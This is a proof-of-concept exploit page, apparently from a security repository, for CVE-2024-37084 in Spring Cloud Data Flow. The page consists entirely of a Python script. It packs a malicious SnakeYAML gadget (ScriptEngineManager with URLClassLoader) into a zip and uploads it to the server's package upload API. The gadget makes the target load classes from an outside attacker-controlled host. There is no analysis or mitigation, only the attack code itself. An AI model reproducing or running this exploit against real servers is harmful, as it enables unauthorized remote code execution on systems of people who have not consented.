
 # Spring Cloud Data Flow（SCDF）反序列 CVE-2024-37084



 ## POC

 ```
# encoding=utf-8
import json,os,re
import zipfile, requests


class POC():
    @classmethod
    def __init__(self, host,dnslog,name):
        self.url = f"http://{host}/api/package/upload"
        print(self.url)
        self.name = name
        self.version = "1.1.1"
        self.repoName = "local"
        self.dnslog = dnslog
        self.body = {"repoName": self.repoName, "name": self.name, "version": self.version, "extension": "zip",
                     "packageFileAsBytes": []}
        self.headers = {"Host": host,
                        "Accept-Encoding":"gzip,deflate",
                        "Upgrade-Insecure-Requests":"1",
                        "Pragma": "no-cache",
                        "Cache-Control": "no-cache",
                        "Content-type":"application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"}

    def make_zip(self):
        binary1 = f"apiVersion: 1.0.0\norigin: my origin\nrepositoryId: 12345\nrepositoryName: {self.repoName}\nkind: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"{self.dnslog}\"]]]]\nname: {self.name}\nversion: {self.version}"
        binary1 = binary1.encode('utf-8')
        filename="{}-{}".format(self.name, self.version)
        filename_zip="{}-{}.zip".format(self.name, self.version)
        try:
            os.mkdir(filename)
        except:
            pass
        with open(os.path.join(filename,"package.yaml"), 'wb') as file:
            file.write(binary1)
        with zipfile.ZipFile(filename_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:

            for dir_name, _, files in os.walk(filename):
                for file in files:
                    full_path = os.path.join(dir_name, file)
                    relative_path = os.path.relpath(full_path, os.path.dirname(filename))
                    print(relative_path)
                    zipf.write(full_path, relative_path)

        with open(filename_zip, 'rb') as file:
            data = file.read()
        return [byte for byte in data]

    def run(self):
        data = p.make_zip()
        self.body['packageFileAsBytes'] = data
        body = json.dumps(self.body)
        res = requests.post(url=self.url, headers=self.headers, data=body,timeout=100)
        status = res.status_code
        if int(status)==500 and "repositoryName" in res.text:
            print("~~~")
        print(status)


if __name__ == '__main__':
    host = "IP:POST"
    dnslog = "http://1.xxx.dnslog.cn"
    name = "test2"
    t=re.findall("(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)",host)
    if len(t)>=1:
        pass
    else:
        host=str(input("please enter host(host:post) :")).strip()
        t = re.findall("(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)", host)
    host = t[0]
    if  len(dnslog)<=1:
        host = input("please enter dns(http://xxx.dnslog.cn)   :")
    p = POC(host,dnslog,name)
    p.run()




```
